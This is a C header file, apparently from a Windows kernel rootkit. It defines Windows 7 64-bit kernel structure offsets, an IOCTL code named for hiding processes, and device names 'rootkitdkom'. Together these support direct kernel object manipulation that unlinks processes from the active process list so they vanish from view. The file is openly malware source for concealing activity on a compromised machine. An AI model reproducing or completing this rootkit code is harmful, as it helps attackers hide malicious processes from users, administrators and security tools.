// Microsoft Windows 7 64 bits Home Premium Service Pack 1
// Hard Offset
#define UniqueProcessId 0x180		//	pid
#define ActiveProcessLinks 0x188	//	_list_entry [Flink, Blink]
#define ImageFileName 0x2e0			//	file name

// IOCTL config
#define SIOCTL_TYPE 40000
#define IRP_CODE_HIDE 0x900 // rootkit()
#define IOCTL_SIOCTL_METHOD_BUFFERED CTL_CODE(SIOCTL_TYPE, IRP_CODE_HIDE, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ALIAS
#define NT_DEVICE_NAME L"\\Device\\rootkitdkom"
#define DOS_DEVICE_NAME L"\\DosDevices\\rootkitdkom"

